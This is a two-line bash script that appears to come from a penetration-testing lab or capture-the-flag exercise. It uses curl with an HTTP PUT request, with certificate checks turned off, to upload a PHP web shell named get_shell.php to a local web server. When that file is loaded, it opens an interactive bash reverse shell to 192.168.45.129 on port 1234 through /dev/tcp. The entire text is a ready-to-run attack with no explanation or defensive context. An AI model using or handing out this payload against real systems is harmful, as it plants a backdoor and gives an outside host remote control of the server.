#!/bin/bash
curl -X PUT "https://localhost/get_shell.php" -H "Content-Type: text/plain" -k -d '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/192.168.45.129/1234 0>&1'\''");?>'
